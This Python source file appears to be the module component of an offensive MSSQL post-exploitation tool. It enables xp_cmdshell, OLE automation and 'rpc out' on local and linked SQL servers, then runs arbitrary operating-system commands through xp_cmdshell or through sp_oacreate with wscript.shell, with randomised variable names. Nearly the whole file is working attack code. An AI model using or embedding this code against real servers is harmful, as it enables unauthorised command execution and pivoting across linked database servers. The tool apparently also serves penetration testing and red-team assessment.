import random
import string

from pysqlrecon.logger import logger    


class ModuleMixin:
    OLE_OUTPUT_COL = "Column1"
    OLE_DESIRED_VAL = 0
    OLE_LINK_OUTPUT_COL = ""
    OLE_LINK_DESIRED_VAL = 1

    # check status of a module
    def check_module(self, name) -> bool:
        query = "SELECT CAST(name AS NVARCHAR(128)) AS name, " \
                "CAST(value_in_use AS INT) AS value_in_use\n" \
                "FROM sys.configurations\n" \
                f"WHERE name = '{name}';"
        
        self.exec_standard_query(query)

        if self.ms_sql.rows[0]['value_in_use'] == 1:
            return True
        
        return False
        
    
    # toggle a module on/off on a linked server
    def linked_module_toggle(self, name, value) -> None:
        if not self.check_rpc_on_link(self.link):
            logger.warning(f"RPC needs to be enabled on {self.link} first")
            exit()

        if name == "rpc":
            query = f"EXEC sp_serveroption '{self.link}', 'rpc out', '{value}';"
        else:
            query = f"sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure '{name}', {value}; RECONFIGURE;"
        self.exec_lquery_rpc(query)


    # get the status of a module on a linked server
    def linked_check_module(self, name) -> bool:
        query = "SELECT CAST(name AS NVARCHAR(128)) AS name, " \
                "CAST(value_in_use AS INT) AS value_in_use\n" \
                "FROM sys.configurations\n" \
                f"WHERE name = '{name}';"
        
        self.exec_lquery(query)
        
        if self.ms_sql.rows[0]['value_in_use'] == 1:
            return True
        
        return False

    
    # toggle a module on/off on local server
    def module_toggle(self, name, value, link_host=None) -> None:
        if name == "rpc":
            query = f"EXEC sp_serveroption '{link_host}', 'rpc out', '{value}';"
        else:
            # reconfigure
            query = "EXEC sp_configure 'show advanced options', 1; " \
                    "RECONFIGURE; " \
                    f"EXEC sp_configure '{name}', {value}; " \
                    "RECONFIGURE;"
        
        self.query_handler(query)


    # run a command via xp_cmdshell
    def xpcmd(self, cmd) -> None:
        if self.link is not None:
            query = f"select 1; exec master..xp_cmdshell '{cmd}'"
            self.exec_lquery(query)
        else:
            query = f"EXEC xp_cmdshell '{cmd}';"
            self.exec_standard_query(query)


    # run a command via OLE automation procedures
    def ole_cmd(self, cmd) -> None:
        output = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        program = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        logger.info(f"Setting sp_oacreate to '{output}'")
        logger.info(f"Setting sp_oamethod to '{program}'")

        query = f"DECLARE @{output} INT; \n" \
                f"DECLARE @{program} VARCHAR(255);\n" \
                f"SET @{program} = 'Run(\"{cmd}\")';\n" \
                f"EXEC sp_oacreate 'wscript.shell', @{output} out;\n" \
                f"EXEC sp_oamethod @{output}, @{program};\n" \
                f"EXEC sp_oadestroy @{output};"
        
        col = ModuleMixin.OLE_OUTPUT_COL
        val = ModuleMixin.OLE_DESIRED_VAL
        
        if self.link:
            self.exec_lquery("select 1; " + query)
            col = ModuleMixin.OLE_LINK_OUTPUT_COL
            val = ModuleMixin.OLE_LINK_DESIRED_VAL
        else:
            self.exec_standard_query(query)

        if self.get_last_resp(col) == val:
            logger.info("Command executed")
            logger.info(f"Destroyed '{output}' and '{program}'")
        else:
            logger.error("Error executing OLE command")
